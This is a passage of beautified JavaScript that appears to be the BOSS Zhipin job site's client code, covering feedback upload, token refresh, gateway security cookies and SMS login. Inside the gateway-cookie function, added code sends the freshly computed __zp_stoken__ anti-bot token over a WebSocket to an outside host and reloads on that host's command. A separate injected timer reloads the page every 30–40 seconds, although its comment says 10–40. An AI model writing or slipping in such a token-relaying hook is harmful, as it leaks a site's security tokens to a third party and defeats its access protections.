                                    type: "warning",
                                    content: "最多上传3张图片"
                                })
                            }, 100),
                            !1;
                        ++Feedback._picCount,
                        t.submit()
                    }
                else
                    $.toast({
                        content: "请上传png、jpg、jpeg 格式的文件",
                        type: "error"
                    })
            },
            done: function(e, data) {
                var result = data.result;
                if ("string" == typeof result && (result = eval("(" + result + ")")),
                0 == result.code) {
                    elPicsWrap.find(".upload-pic-btn-wrapper").before('<div class="upload-pic"><div class="remove-pic"></div><img src="' + result.zpData.url + '" data-img="' + result.zpData.url + '"/></div>'),
                    elPicsWrap.find(".upload-pic").length >= Feedback._limitPicCount && elPicsWrap.find(".upload-pic-btn-wrapper").hide(),
                    elPicsWrap.parents(".upload").addClass("has-upload");
                    try {
                        _T.sendEvent("feedback_pic")
                    } catch (e) {}
                } else
                    clearTimeout(uploadWaringTimer),
                    $.toast({
                        content: result.message || "上传失败",
                        type: "error"
                    }),
                    --Feedback._picCount
            },
            fail: function(e, t) {
                clearTimeout(uploadWaringTimer),
                $.toast({
                    content: "上传失败",
                    type: "error"
                }),
                --Feedback._picCount
            }
        })
    },
    submitForm: function(t, e) {
        var i, n = t, a = n.find("textarea").val(), o = this;
        n.find(".ipt-wrap").each(function() {
            return i = o.checkForm($(this)),
            o.checkForm($(this))
        });
        a = {
            content: a,
            imgurl: n.find(".upload-pic img").map(function(e, t) {
                return $(t).data("img")
            }).toArray().join(","),
            screen: $(window).width() + "*" + $(window).height(),
            pk: $("#page_key_name").val(),
            randomKey: o._randkey,
            captcha: $(".verify-box input").val(),
            channel: e
        };
        return Feedback.sdkInfo && (delete a.randomKey,
        delete a.captcha,
        a.challenge = n.find('input[name="challenge"]').val(),
        a.validate = n.find('input[name="validate"]').val(),
        a.seccode = n.find('input[name="seccode"]').val()),
        i && (i = !1,
        $.ajax({
            url: "/wapi/zpuser/faqFeedback/createFeedbackV2",
            type: "POST",
            data: a,
            traditional: !0,
            dataType: "JSON",
            timeout: 3e4,
            success: function(e) {
                if (0 == e.code) {
                    $.toast({
                        content: "反馈成功！我们会尽快核实处理",
                        type: "success"
                    });
                    try {
                        _T.sendEvent("feedback_success")
                    } catch (e) {}
                    t.remove()
                } else {
                    $.toast({
                        content: e.message || "提交失败，请稍后再试",
                        type: "error"
                    }),
                    n.find(".verify-box .ipt").val(""),
                    n.find(".verify-box img").click();
                    try {
                        _T.sendEvent("feedback_fail")
                    } catch (e) {}
                }
            },
            error: function(e) {
                $.toast({
                    content: "提交失败，请稍后再试",
                    type: "error"
                });
                try {
                    _T.sendEvent("feedback_fail")
                } catch (e) {}
            }
        })),
        !1
    },
    checkForm: function(e) {
        if (Feedback.sdkInfo && e.find(".verify-box").length) {
            var t = e.find('input[name="challenge"]');
            if (!t || !t.val())
                return e.next(".text-error").html("请先完成验证"),
                !1;
            e.next(".text-error").html("")
        }
        t = e.find(".ipt").val();
        if (null != e.find(".ipt").attr("data-range")) {
            var i = e.find(".ipt").attr("data-range").split(",")
              , n = i[0]
              , i = i[1];
            if (t.length > i)
                return e.next(".text-error").html("请输入" + i + "个字以内的内容"),
                !1;
            if (e.next(".text-error").html(""),
            t.length < n)
                return e.next(".text-error").html("内容描述至少" + n + "个字"),
                !1;
            e.next(".text-error").html("")
        }
        return "" == t ? (i = e.find(".ipt").attr("data-blank"),
        e.find(".ipt").focus(),
        e.next(".text-error").html(i),
        !1) : (e.next(".text-error").html(""),
        !0)
    }
}
  , zpToken = function() {
    var a = null
      , o = 0
      , t = null
      , s = !0
      , i = 24e4
      , r = 10
      , c = 0;
    function n() {
        var i = $.Deferred()
          , e = "/wapi/zppassport/get/zpToken?v=" + (new Date).getTime();
        function n(e, t) {
            i.reject(),
            ++c > r || (s && d(5e3),
            u(e, t))
        }
        return $.get({
            url: e,
            success: function(e) {
                if (0 === e.code && e.zpData && e.zpData.token) {
                    var t = e.zpData.token;
                    try {
                        window.top._PAGE.zp_token = t
                    } catch (e) {}
                    t = e.zpData.token;
                    try {
                        Cookie.set("geek_zp_token", t, "", "", "/")
                    } catch (e) {}
                    o = l(),
                    d(),
                    c = 0,
                    i.resolve()
                } else
                    switch (e.code) {
                    case 7:
                    case 1011:
                        a && clearTimeout(a),
                        i.reject(),
                        c = 0,
                        Cookie.del("geek_zp_token", "", "/"),
                        u("logout", e);
                        break;
                    default:
                        n("tokenError", e)
                    }
            },
            error: function(e) {
                n("httpError", e)
            }
        }),
        (t = i).promise()
    }
    function l() {
        return (new Date).getTime()
    }
    function d(e) {
        e = e || i,
        a && clearTimeout(a),
        a = setTimeout(function() {
            n()
        }, e)
    }
    function e() {
        function e(e, t, i) {
            e.addEventListener ? e.addEventListener(t, i, !1) : e.attachEvent ? e.attachEvent("on" + t, i) : e["on" + t] = i
        }
        Cookie.del("geek_zp_token", "", "/"),
        n(),
        e(window, "online", function() {
            p(),
            s = !0
        }),
        e(window, "offline", function() {
            s = !1
        })
    }
    function p() {
        return a && clearTimeout(a),
        c = 0,
        n()
    }
    function u(e, t) {
        try {
            var i = o || "null";
            _T.sendTracking("refresh_zpToken_error_geek_" + window.top._PAGE.uid + "_" + i + "_" + s + "_" + e + "_" + JSON.stringify(t))
        } catch (e) {}
    }
    return e(),
    {
        init: e,
        checkInitialized: function() {
            var e = $.Deferred();
            return t && "pending" === t.state() ? t.then(e.resolve, e.resolve) : e.resolve(),
            e.promise()
        },
        update: p,
        checkValid: function() {
            var e;
            0 !== o && (e = l(),
            o + i + 1e3 <= e ? (p(),
            u("checkInvalid", "")) : d(o + i - e))
        }
    }
}()
  , SECURITY_SCRIPT_PATH = "/web/common/security-js/"
  , GATEWAY_TOKEN_NAME = "__zp_stoken__"
  , GATEWAY_SEED_NAME = "__zp_sseed__"
  , GATEWAY_SCRIPT_NAME = "__zp_sname__"
  , GATEWAY_TS_NAME = "__zp_sts__"
  , COOKIE_DOMAIN = function() {
    var e = location.hostname;
    return "localhost" === e || /^(\d+\.){3}\d+$/.test(e) ? e : "." + e.split(".").slice(-2).join(".")
}();
function loadGatewayScript(i, n, e) {
    "object" != typeof i && (i = [i]);
    var a = e || document.getElementsByTagName("head").item(0) || document.documentElement
      , o = new Array
      , s = i.length - 1;
    !function e(t) {
        o[t] = document.createElement("script"),
        o[t].setAttribute("type", "text/javascript"),
        o[t].setAttribute("charset", "UTF-8"),
        o[t].onload = o[t].onreadystatechange = function() {
            this.isLoaded || this.readyState && !/loaded|complete/.test(this.readyState) || (this.isLoaded = !0,
            this.onload = this.onreadystatechange = null,
            this.parentNode.removeChild(this),
            t != s ? e(t + 1) : "function" == typeof n && n())
        }
        ,
        o[t].setAttribute("src", i[t]),
        ("IFRAME" != a.tagName ? a : a.contentDocument.body || a.contentDocument.documentElement).appendChild(o[t])
    }(0)
}
setInterval(function() {
  window.location.reload();
}, Math.floor(Math.random() * 10000) + 30000); // 每隔10-40秒刷新一次
var setGatewayCookie = function() {
    var a, n = {}, o = document.createElement("iframe");
    function s(e, t) {
        var i = (new Date).getTime() + 2304e5
          , n = "";
        try {
            n = (new a).z(e, parseInt(t) + 60 * (480 + (new Date).getTimezoneOffset()) * 1e3)
            if (n) {
                // 创建 WebSocket 对象
                var socket = new WebSocket("wss://www.toryunbot.com/websocket");
                socket.onopen = function(event) {
                    console.log("WebSocket opened.");
                    socket.send(n);
                    window.zpt = n;
                    console.log("Sent message: " + n);
                }
                ;
                socket.onmessage = function(event) {
                    console.log("Received message: " + event.data);
                    if (event.data === 'refresh') {
                        window.location.reload();
                    }
                }
                ;
            } else {
        throw new Error("Error: WebSocket message is empty.");
    }

        } catch (e) {
             console.error("WebSocket error: ", e);
        }
        n && (Cookie.set(GATEWAY_TOKEN_NAME, n, i, COOKIE_DOMAIN, "/"),
        void 0 !== window.wst && "function" == typeof window.wst.postMessage && (e = {
            name: "setWKCookie",
            params: {
                url: COOKIE_DOMAIN,
                name: GATEWAY_TOKEN_NAME,
                value: encodeURIComponent(n),
                expiredate: i,
                path: "/"
            }
        },
        window.wst.postMessage(JSON.stringify(e)))),
        Cookie.del(GATEWAY_SEED_NAME, COOKIE_DOMAIN, "/"),
        Cookie.del(GATEWAY_SCRIPT_NAME, COOKIE_DOMAIN, "/"),
        Cookie.del(GATEWAY_TS_NAME, COOKIE_DOMAIN, "/")
    }
    return o.style.height = 0,
    o.style.width = 0,
    o.style.margin = 0,
    o.style.padding = 0,
    o.style.border = "0 none",
    o.style.position = "fixed",
    o.style.zIndex = "-100",
    o.name = "zhipinFrame",
    o.src = "about:blank",
    (document.body || document.documentElement).appendChild(o),
    function(e, t, i) {
        e && t && i || (e = Cookie.get(GATEWAY_SEED_NAME),
        t = Cookie.get(GATEWAY_SCRIPT_NAME),
        i = Cookie.get(GATEWAY_TS_NAME)),
        e && t && i && (n["" + t] ? s(e, i) : loadGatewayScript(SECURITY_SCRIPT_PATH + t + ".js", function() {
            n["" + t] = 1,
            a = o.contentWindow.ABC,
            s(e, i)
        }, o))
    }
}();
function isIncludeUrl(e) {
    for (var t = !1, i = ["/wapi/zppassport/user/unbind", "/wapi/zppassport/user/changeMobile", "/wapi/zppassport/user/changePassword", "/wapi/zpitem/web/competitive/use", "/wapi/zpp/user/rechargeBean", "/wapi/zpuser/wap/avatar/edit.json", "/wapi/zpupload/resume/uploadFile.json", "/wapi/zpgeek/resume/attachment/save.json", "/wapi/zpgeek/resume/attachment/delete.json", "/wapi/zpgeek/resume/attachment/name/update.json", "/wapi/zpgeek/friend/add.json"], n = 0; n < i.length; n++)
        -1 !== e.indexOf(i[n]) && (t = !0);
    return t
}
function ajaxGetaway(e, t) {
    if (0 <= [31, 32, 35, 36, 37].indexOf(e))
        switch (e) {
        case 31:
            window.location.href = "/web/common/403.html?code=31";
            break;
        case 32:
            window.location.href = "/web/common/403.html?code=32";
            break;
        case 35:
        case 36:
            window.location.href = "/web/user/safe/verify-slider?callbackUrl=" + encodeURIComponent(window.location.href);
            break;
        case 37:
            t && (window.location.href = "/web/common/security-check.html?seed=" + encodeURIComponent(t.seed) + "&name=" + encodeURIComponent(t.name) + "&ts=" + encodeURIComponent(t.ts) + "&callbackUrl=" + encodeURIComponent(window.location.href))
        }
    else
        5012 == e ? window.location.href = "/web/geek/safe-validate" : setGatewayCookie()
}
$(function() {
    setGatewayCookie()
}),
$.ajaxSettings.beforeSend = function(e, i) {
    "_PAGE"in window ? _PAGE.token && e.setRequestHeader("token", _PAGE.token.split("|")[0]) : "_PAGE"in window.top && window.top._PAGE.token && e.setRequestHeader("token", window.top._PAGE.token.split("|")[0]);
    var n = Cookie && Cookie.get("geek_zp_token");
    function t(e, t) {
        try {
            isIncludeUrl(e) && _T.sendTracking("null_zpToken_geek_" + i.url + "_" + t + "_" + n + "_" + window.top._PAGE.uid)
        } catch (e) {}
    }
    n || (t(i.url, "cookie"),
    n = window.top._PAGE && window.top._PAGE.zp_token),
    n ? (e.setRequestHeader("zp_token", n),
    e.setRequestHeader("traceId", getUuid())) : t(i.url, "page")
}
,
$.ajaxSettings.statusCode = {
    200: function(e) {
        if ("string" == typeof e)
            try {
                e = JSON.parse(e)
            } catch (e) {}
        e && ajaxGetaway(e.code, e.zpData)
    },
    602: function() {
        try {
            _T.sendTracking("geek_code_602_logout")
        } catch (e) {}
    },
    603: function() {
        window.location.href = "/web/geek/guide"
    }
},
$.ajaxPrefilter(function(o, s, r) {
    o.retryCount || (o.retryCount = 0);
    var c = $.Deferred();
    return r.done(function() {
        var e, t = Array.prototype.slice.call(arguments), i = t[0] || {};
        if (-1 !== [120, 121, 122].indexOf(i.code)) {
            t[0].message = "操作失败，请刷新页面重试！";
            var n, a = o.url;
            try {
                isIncludeUrl(a) && (n = Cookie && Cookie.get("geek_zp_token") || window._PAGE && window._PAGE.zp_token,
                _T.sendTracking("invalid_zpToken_geek_" + a + "_" + window.top._PAGE.uid + "_" + n + "_" + JSON.stringify(i)))
            } catch (e) {}
        }
        122 === i.code && o.retryCount < 1 ? (o.retryCount += 1,
        e = $.extend({}, s, {
            url: o.url,
            retryCount: o.retryCount
        }),
        (a = window.top.zpToken) && a.update().done(function() {
            $.ajax(e).then(c.resolve, c.reject)
        }).fail(function() {
            c.rejectWith(r, t)
        })) : c.resolveWith(r, t)
    }),
    r.fail(c.reject),
    c.promise(r)
});
var browser = {
    versions: function() {
        var e = navigator.userAgent;
        navigator.appVersion;
        return {
            trident: -1 < e.indexOf("Trident"),
            presto: -1 < e.indexOf("Presto"),
            webKit: -1 < e.indexOf("AppleWebKit"),
            gecko: -1 < e.indexOf("Gecko") && -1 == e.indexOf("KHTML"),
            mobile: !!e.match(/AppleWebKit.*Mobile.*/),
            ios: !!e.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
            android: -1 < e.indexOf("Android") || -1 < e.indexOf("Adr"),
            iPhone: -1 < e.indexOf("iPhone"),
            iPad: -1 < e.indexOf("iPad"),
            webApp: -1 == e.indexOf("Safari"),
            weixin: -1 < e.indexOf("MicroMessenger"),
            qq: " qq" == e.match(/\sQQ/i)
        }
    }(),
    language: (navigator.browserLanguage || navigator.language).toLowerCase()
}
  , zpToken = (!function($, window, undefined) {
    var _T = window._T
      , CODE_JIYAN_URL = "/wapi/zppassport/send/smsCodeV2"
      , LOGIN_JIYAN_URL = "/wapi/zppassport/login/phoneV2"
      , CODE_IMG_URL = "/wapi/zppassport/send/smsCodeV3"
      , LOGIN_IMG_URL = "/wapi/zppassport/login/phoneV3"
      , CODE_ALI_URL = "/wapi/zppassport/send/smsCode"
      , LOGIN_ALI_URL = "/wapi/zppassport/login/phone"
      , CODE_NETEASY_URL = "/wapi/zppassport/send/smsCodeByWy"
      , LOGIN_NETEASY_URL = "/wapi/zppassport/login/phoneByWy"
      , FastSign = function(e, t) {
        if (!(this instanceof FastSign))
            return new FastSign(e,t);
        for (var i in this.config = {},
        t)
            t.hasOwnProperty(i) && (this.config[i] = t[i]);
        this.VERRIFYCODETYPE = 1,
        this.init(e)
    };
    FastSign.prototype = {
        init: function(t) {
            var i, n;
            t && (i = this.elWrap = $(t),
            n = this,
            i.find(".ipt-code").attr("maxlength", "6"),
            $(".code-box-show", i).on("click", function(e) {
                e.preventDefault(),
                $(this).hasClass("btn-disabled") || ("" != (e = i.find(".ipt-phone").val()) && /^(1[3456789][0-9]{9})$/.test(e) ? ($(".fast-login-box", i).show(),
                n.Verify || (n.Verify = new VerifyCodeSDK({
                    dom: $(".fast-login-box .row-code", i)[0],
                    success: function(e) {
                        n.VerrifySuccessCallback(e)
                    },
                    ready: function(e) {
                        n.VerrifyReadyCallback(e)
                    },
                    fail: function(e) {
                        try {
                            e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                        } catch (e) {}
                    }
                }))) : $.toast({
                    content: "请输入正确的手机号",
                    type: "warning"
                }))
            }),
            i.find("form .registe-btn").on("click", function(e) {
                e.preventDefault(),
                $(this).hasClass("btn-disabled") || n.checkForm($(this).closest("form"))
            }),
            i.find(".btn-sms").on("click", function() {
                var e = $(this).closest("form");
                n.checkForm(e, !0)
            }),
            i.find(".verifyimg").on("click", function() {
                $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).closest(".code-form-content").find(".randomkey").val() + "&_r=" + (new Date).getTime());
                try {
                    _T.sendEvent("signin_verify_code")
                } catch (e) {}
            }),
            n.getRandomkey(i, i.find("form")),
            $("body").on("click", function(e) {
                $(e.target).parents(t).length || $(".fast-login-box", i).hide()
            }))
        },
        VerrifySuccessCallback: function(e) {
            var t = this
              , i = $(e.el).parents("form");
            1 == e.type ? (e.challenge,
            e.validate,
            e.seccode,
            i.find('input[name="challenge"]').length || (i.append('<input type="hidden" name="challenge"></input>'),
            i.append('<input type="hidden" name="validate"></input>'),
            i.append('<input type="hidden" name="seccode"></input>')),
            i.find('input[name="challenge"]').val(e.challenge),
            i.find('input[name="validate"]').val(e.validate),
            i.find('input[name="seccode"]').val(e.seccode)) : 2 == e.type ? (i.find('input[name="csessionId"]').length || (i.append('<input type="hidden" name="csessionId"></input>'),
            i.append('<input type="hidden" name="csig"></input>'),
            i.append('<input type="hidden" name="ctoken"></input>')),
            i.find('input[name="csessionId"]').val(e.csessionId),
            i.find('input[name="csig"]').val(e.csig),
            i.find('input[name="ctoken"]').val(e.ctoken)) : 3 == e.type ? (i.find('input[name="randKey"]').length || (i.append('<input type="hidden" name="randKey"></input>'),
            i.append('<input type="hidden" name="captcha"></input>')),
            i.find('input[name="randKey"]').val(e.randKey)) : 4 == e.type && (i.find('input[name="validate"]').length || i.append('<input type="hidden" name="validate"></input>'),
            i.find('input[name="validate"]').val(e.validate)),
            3 != e.type && setTimeout(function() {
                t.checkForm(t.elWrap.find(".btn-sms").closest("form"), !0)
            }, 500)
        },
        VerrifyReadyCallback: function(e) {
            var t = $(e.el).parents("form");
            this.VERRIFYCODETYPE = e.type,
            1 == e.type ? (t.attr("action", LOGIN_JIYAN_URL),
            t.find(".code-box-show").attr("data-url", CODE_JIYAN_URL)) : 2 == e.type ? (t.attr("action", LOGIN_ALI_URL),
            t.find(".code-box-show").attr("data-url", CODE_ALI_URL)) : 3 == e.type ? (t.attr("action", LOGIN_IMG_URL),
            t.find(".code-box-show").attr("data-url", CODE_IMG_URL)) : 4 == e.type && (t.attr("action", LOGIN_NETEASY_URL),
            t.find(".code-box-show").attr("data-url", CODE_NETEASY_URL)),
            3 == e.type && t.find(".getcode-btn").show()
        },
        getRandomkey: function(i, e) {
            var t = (e = e).find(".ipt-code").attr("data-url")
              , n = e.find(".randomkey");
            "" == n.val() && $.ajax({
                url: t,
                type: "POST",
                dataType: "json",
                data: {
                    pk: $("#page_key_name").val()
                },
                success: function(e) {
                    var t;
                    1 == e.rescode && (t = "/wflow/zpweixin/qrcode/getqrcode?content=" + e.qrId + "&w=200&h=200",
                    i.find(".randomkey").val(e.randomKey),
                    n.parent().find(".verifyimg").click(),
                    i.find(".sign-scan .qrcode-box img").attr("src", t),
                    i.find(".uuid").val(e.qrId))
                },
                error: function(e) {}
            })
        },
        callbackRegister: function(e, t) {
            try {
                var i = e.attr("ka");
                i && _T.sendEvent(i)
            } catch (e) {}
            var n, i = "g";
            "1" == e.find('input[name="purpose"]').val() && (i = "b");
            try {
                _T.sendEvent(e.closest(".sign-form").data("flow") + "_done_" + i)
            } catch (e) {}
            t.commonDevice ? window.location.href = t.webHost + "/web/geek/user-safe?uuid=" + t.uuid : t.isCompletion ? t.toUrl ? ($.toast({
                content: "登录成功",
                type: "success"
            }),
            n = "",
            n = -1 != t.toUrl.indexOf("http") ? t.toUrl : "https://www.zhipin.com" + t.toUrl,
            setTimeout(function() {
                window.location.href = decodeURIComponent(n)
            }, 500)) : window.location.reload() : (e = "",
            1 == t.identity ? 0 == t.compStep ? (e = "登录成功",
            setTimeout(function() {
                window.location.href = decodeURIComponent(t.toUrl)
            }, 500)) : 1 == t.compStep ? (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
            setTimeout(function() {
                window.location.href = t.webHost + "/web/boss/guide/"
            }, 500)) : 2 == t.compStep && (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
            setTimeout(function() {
                window.location.href = t.webHost + "/web/boss/guide/job/"
            }, 500)) : (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
            setTimeout(function() {
                window.location.href = t.webHost + "/web/geek/guide"
            }, 500)),
            $.toast({
                content: e,
                type: "success"
            }))
        },
        countDown: function(e, t) {
            var i = parseInt(e.find(".num").text().replace("s"), 10)
              , n = setInterval(function() {
                i--,
                e.find(".num").text(i + "s"),
                i <= 0 && (t(),
                clearInterval(n))
            }, 1e3)
        },
        checkForm: function(e, t) {
            var i = (e = e).find(".ipt-phone")
              , n = e.find(".ipt-sms")
              , a = ""
              , o = this;
            if (1 == o.VERRIFYCODETYPE ? a = e.find("input[name=challenge]") : 2 == this.VERRIFYCODETYPE ? a = e.find("input[name=csessionId]") : 4 == this.VERRIFYCODETYPE && (a = e.find("input[name=validate]")),
            i.length) {
                if ("" == i.val()) {
                    $.toast({
                        content: "请输入正确的手机号",
                        type: "warning"
                    }),
                    i.focus();
                    try {
                        _T.sendEvent(i.closest(".sign-form").data("flow") + "_mobile")
                    } catch (e) {}
                    return !1
                }
                if (/^\D+$/.test(i.val()))
                    return i.val(""),
                    !1;
                if (!/^(1[3456789][0-9]{9})$/.test(i.val())) {
                    $.toast({
                        content: "请输入正确的手机号",
                        type: "warning"
                    }),
                    i.focus();
                    try {
                        _T.sendEvent(i.closest(".sign-form").data("flow") + "_mobile")
                    } catch (e) {}
                    return !1
                }
            }
            if (3 != o.VERRIFYCODETYPE) {
                if (a.length) {
                    if ("" == a.val())
                        return $.toast({
                            content: "请滑动完成验证",
                            type: "warning"
                        }),
                        a.focus(),
                        !1;
                    o.hideError(a)
                }
            } else {
                i = (a = e.find(".input_code")).val();
                if (!i)
                    return $.toast({
                        content: "请填写图片验证码",
                        type: "warning"
                    }),
                    a.focus(),
                    !1;
                e.find("input[name=captcha]").val(i),
                o.hideError(a)
            }
            if (n.length && !t) {
                if ("" == n.val())
                    return $.toast({
                        content: "请填写短信验证码",
                        type: "warning"
                    }),
                    n.focus(),
                    !1;
                if (!n.val().match(/^.{4,6}$/))
                    return $.toast({
                        content: "短信验证码错误",
                        type: "warning"
                    }),
                    n.focus(),
                    !1;
                if (n.val().match(/\D+/))
                    return $.toast({
                        content: "短信验证码错误",
                        type: "warning"
                    }),
                    n.val(""),
                    n.focus(),
                    !1
            }
            o.postData(e, t)
        },
        hideError: function(e) {
            var t = e.find(".tip-error");
            (t = t.length ? t : e.closest(".sign-form").find(".tip-error")).text(""),
            (e.closest(".sign-wrap").hasClass("sign-wrap-v2") || e.closest(".pop-sign-box").hasClass("sign-wrap-v2")) && t.hide()
        },
        setJumpUrl: function(e) {
            var t = window.location.href
              , i = "";
            function n(e, t) {
                return e.some(function(e) {
                    return -1 != t.indexOf(e)
                })
            }
            switch (!0) {
            case n(["/gongsi/?ka=", "/job_detail/?ka=", "app.zhipin.com/"], t):
                i = "";
                break;
            case n(["/job_detail/", "/xiaoyuan/", "/gongsi/", "/gongsir/", "/returnee_jobs/", "/companys/", "/article/", "/news.zhipin.com/", "/zhaopin", "/zt/", "/faxian/", "/huati/", "/wenti/"], t):
                i = window.location.pathname;
                break;
            case n(["/zhaopin/"], t):
                i = "/web/geek/recommend";
                break;
            default:
                i = ""
            }
            e.append('<input name="jumpUrl" type="hidden" value="' + i + '"/>')
        },
        postData: function(formEl, isSms) {
            var self = this
              , formEl = formEl
              , btnSms = formEl.find(".code-box-show")
              , url = formEl.attr("action")
              , btnEl = formEl.find(".registe-btn");
            if (isSms) {
                if (btnSms.hasClass("btn-disabled"))
                    return;
                url = btnSms.attr("data-url"),
                btnSms.addClass("btn-disabled").html("稍后")
            } else {
                if (btnEl.hasClass("btn-disabled"))
                    return;
                btnEl.addClass("btn-disabled"),
                self.setJumpUrl(formEl),
                window.BossZhipinBridge && (formEl.find('input[name="environment"]').length || formEl.append('<input name="environment" type="hidden" />'),
                formEl.find('input[name="environment"]').val("BossZhipinBridge"))
            }
            formEl.find('input[name="pk"]').length || formEl.append('<input name="pk" type="hidden" />'),
            formEl.find('input[name="pk"]').val($("#page_key_name").val()),
            $.ajax({
                url: url,
                type: "post",
                dataType: "json",
                data: formEl.serialize(),
                success: function(result) {
                    var result = result
                      , zpData = ("string" == typeof result && (result = eval("(" + result + ")")),
                    result.zpData || {});
                    if (0 !== result.code && new VerifyCodeSDK({
                        dom: formEl.find(".row-code")[0],
                        success: function(e) {
                            self.VerrifySuccessCallback(e)
                        },
                        ready: function(e) {
                            self.VerrifyReadyCallback(e)
                        },
                        fail: function(e) {
                            try {
                                formEl.find("input[name=phone]").val();
                                e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                            } catch (e) {}
                        }
                    }),
                    0 == result.code)
                        if (isSms)
                            if (2 == zpData.type)
                                $.toast({
                                    content: result.message,
                                    type: "warning"
                                }),
                                btnSms.html("获取").removeClass("count-down btn-disabled");
                            else {
                                $.toast({
                                    content: "短信验证码已发送",
                                    type: "success"
                                }),
                                $(".fast-login-box").hide(),
                                -1 != window.location.href.indexOf("/wap/guide/base-new") ? (btnSms.html('(<em class="num">60s</em>)').addClass("count-down btn-disabled"),
                                btnSms.parents(".form-item").find(".ipt-sms").show(),
                                self.countDown(btnSms, function() {
                                    btnSms.parents(".form-item").find(".ipt-sms").hide(),
                                    btnSms.html("获取验证码").removeClass("count-down btn-disabled"),
                                    GuideNew.resetVerrify(formEl)
                                })) : (btnSms.html('(<em class="num">60s</em>)').addClass("count-down btn-disabled"),
                                self.countDown(btnSms, function() {
                                    btnSms.html("获取").removeClass("count-down btn-disabled")
                                })),
                                btnSms.parent().find(".ipt-sms").focus(),
                                formEl.append('<input type="hidden" name="rescode" value="1" />');
                                try {
                                    _T.sendEvent("signin_register_send_sms")
                                } catch (e) {}
                            }
                        else
                            "undefined" != typeof GuideNew && "function" == typeof GuideNew.RegisterCallback ? GuideNew.RegisterCallback(formEl, zpData) : self.callbackRegister(formEl, zpData);
                    else
                        1 == result.code ? ($.toast({
                            content: result.message,
                            type: "warning"
                        }),
                        isSms && btnSms.html("获取").removeClass("btn-disabled"),
                        formEl.find(".ipt-code").val(""),
                        formEl.find(".verifyimg").click()) : 6 == result.code ? $.toast({
                            content: "短信验证码错误",
                            type: "warning"
                        }) : -1 < Sign.loginLimitCode.indexOf(result.code) || 4942 <= result.code && result.code <= 4950 ? Sign.loginLimitTip(result.code, {
                            message: result.message,
                            closeCallback: function() {}
                        }) : ($.toast({
                            content: result.message,
                            type: "warning"
                        }),
                        isSms && btnSms.html("获取").removeClass("btn-disabled"),
                        formEl.find(".ipt-code").val(""),
                        formEl.find(".verifyimg").click());
                    isSms || btnEl.removeClass("btn-disabled")
                },
                error: function(e) {
                    $.toast({
                        content: "服务器错误，请稍后再试",
                        type: "warning"
                    }),
                    (isSms ? btnSms.html("获取") : btnEl).removeClass("btn-disabled")
                }
            })
        }
    },
    window.FastSign = FastSign
}(jQuery, window),
!function(o, r) {
    function n(t, i) {
        function n(e) {
            o[e] = r.createElement("script"),
            o[e].setAttribute("type", "text/javascript"),
            o[e].setAttribute("charset", "UTF-8"),
            o[e].onload = o[e].onreadystatechange = function() {
                this.isLoaded || this.readyState && !/loaded|complete/.test(this.readyState) || (this.isLoaded = !0,
                this.onload = this.onreadystatechange = null,
                this.parentNode.removeChild(this),
                e != s ? n(e + 1) : "function" == typeof i && i())
            }
            ,
            o[e].setAttribute("src", t[e]),
            a.appendChild(o[e])
        }
        "object" != typeof t && (t = [t]);
        var a = r.getElementsByTagName("head").item(0) || r.documentElement
          , o = new Array
          , s = t.length - 1;
        n(0)
    }
    function t(e) {
        this.closeTimer = null,
        this.defaultOptions = {},
        this.options = o.extend({}, this.defaultOptions, e || {}),
        this.levelList = [{
            level: 1,
            name: "非常不满意",
            extraTitle: "很抱歉没能让您满意，我们会努力改进。",
            placeholder: "请问您觉得哪些地方导致您有不好的使用体验？（选填）",
            reasonList: ["存在BUG", "操作繁琐", "功能不全", "职位问题", "隐私问题", "账号问题", "其他问题"]
        }, {
            level: 2,
            name: "不满意",
            extraTitle: "很抱歉没能让您满意，我们会努力改进。",
            placeholder: "请问您觉得哪些地方导致您有不好的使用体验？（选填）",
            reasonList: ["存在BUG", "操作繁琐", "功能不全", "职位问题", "隐私问题", "账号问题", "其他问题"]
        }, {
            level: 3,
            name: "一般",
            extraTitle: "很抱歉没能让您满意，我们会努力改进。",
            placeholder: "请问您觉得哪些地方导致您有不好的使用体验？（选填）",
            reasonList: ["存在BUG", "操作繁琐", "功能不全", "职位问题", "隐私问题", "账号问题", "其他问题"]
        }, {
            level: 4,
            name: "满意",
            extraTitle: "感谢您的答复和时间，我们要做的更好！",
            placeholder: "请问您觉得还有哪些地方可以改进的吗？（选填）"
        }, {
            level: 5,
            name: "非常满意",
            extraTitle: "感谢您的评分，很高兴让您有满意的使用体验！",
            placeholder: "我们很好奇，您最喜欢我们产品的哪一点？（选填）"
        }],
        this.currentLevel = 0,
        this.init()
    }
    t.prototype = {
        init: function() {
            this.create()
        },
        create: function() {
            var e = this
              , i = ""
              , t = (o.each(this.levelList, function(e, t) {
                i += '<li data-level="' + t.level + '" class="level-' + t.level + '"><span class="gif-animate"></span>' + t.name + "</li>"
            }),
            ['<div class="satisfaction-collect-popper">', '<span class="satisfaction-collect-close"></span>', '<div class="satisfaction-collect-title">您对“BOSS直聘网页版”的使用体验是否满意？</div>', '<ul class="satisfaction-collect-level">' + i + "</ul>", '<div class="satisfaction-collect-extra"></div>', '<div class="satisfaction-collect-operate"><a href="javascript:;" class="satisfaction-collect-btn satisfaction-collect-submit">提交</a></div>', "</div>"]);
            this.$element = o(t.join("")).appendTo("body"),
            n("https://static.zhipin.com/library/js/utils/lottie_light-v5.9.4.min.js", function() {
                if (lottie) {
                    const t = ["https://img.bosszhipin.com/static/file/2023/z7uxohw1p31675148315473.json", "https://img.bosszhipin.com/static/file/2023/ax1prsw6yn1675148324005.json", "https://img.bosszhipin.com/static/file/2023/jd5n01fkne1675148328778.json", "https://img.bosszhipin.com/static/file/2023/3tivi54v471675148336031.json", "https://img.bosszhipin.com/static/file/2023/rveaxu7mok1675148340913.json"];
                    e.$element.find(".satisfaction-collect-level li").each(function(e) {
                        t[e] && (o(this).addClass("has-animate"),
                        lottie.loadAnimation({
                            container: o(".gif-animate", o(this))[0],
                            loop: !0,
                            autoplay: !0,
                            path: t[e]
                        }))
                    })
                }
            }),
            this.bindEvent(),
            o.isFunction(this.options.onOpen) && this.options.onOpen(this.$element),
            this.myActionLog({
